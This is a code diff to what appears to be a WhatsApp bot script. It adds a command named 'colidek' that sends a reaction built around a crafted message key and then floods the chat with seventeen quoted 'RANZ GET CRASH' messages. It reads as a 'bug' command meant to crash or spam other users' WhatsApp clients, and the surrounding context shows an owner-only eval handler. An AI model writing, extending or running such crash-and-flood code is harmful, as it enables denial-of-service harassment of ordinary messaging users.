@@ -3568,6 +3568,28 @@ m.reply(`SUCCES`)
                 await sleep(20)
             }
                 break
+case 'colidek' : {
+                    a = await hisoka.sendMessage(m.chat, {react: {  key: { remoteJid: m.chat, fromMe: true, id : m.key.id}}})
+                    await hisoka.sendMessage(m.chat, {text:"RANZ GET CRASH"}, {quoted: a})
+                    await hisoka.sendMessage(m.chat, {text:"RANZ GET CRASH"}, {quoted: a})
+                    await hisoka.sendMessage(m.chat, {text:"RANZ GET CRASH"}, {quoted: a})
+                    await hisoka.sendMessage(m.chat, {text:"RANZ GET CRASH"}, {quoted: a})
+                    await hisoka.sendMessage(m.chat, {text:"RANZ GET CRASH"}, {quoted: a})
+                    await hisoka.sendMessage(m.chat, {text:"RANZ GET CRASH"}, {quoted: a})
+                    await hisoka.sendMessage(m.chat, {text:"RANZ GET CRASH"}, {quoted: a})
+                    await hisoka.sendMessage(m.chat, {text:"RANZ GET CRASH"}, {quoted: a})
+                    await hisoka.sendMessage(m.chat, {text:"RANZ GET CRASH"}, {quoted: a})
+                    await hisoka.sendMessage(m.chat, {text:"RANZ GET CRASH"}, {quoted: a})
+                    await hisoka.sendMessage(m.chat, {text:"RANZ GET CRASH"}, {quoted: a})
+                    await hisoka.sendMessage(m.chat, {text:"RANZ GET CRASH"}, {quoted: a})
+                    await hisoka.sendMessage(m.chat, {text:"RANZ GET CRASH"}, {quoted: a})
+                    await hisoka.sendMessage(m.chat, {text:"RANZ GET CRASH"}, {quoted: a})
+                    await hisoka.sendMessage(m.chat, {text:"RANZ GET CRASH"}, {quoted: a})
+                    await hisoka.sendMessage(m.chat, {text:"RANZ GET CRASH"}, {quoted: a})
+                    await hisoka.sendMessage(m.chat, {text:"RANZ GET CRASH"}, {quoted: a})
+                    m.reply(`BUG COLI DEK`)
+                     }
+                break
             default:
                 if (budy.startsWith('=>')) {
                     if (!isCreator) return m.reply(mess.owner)
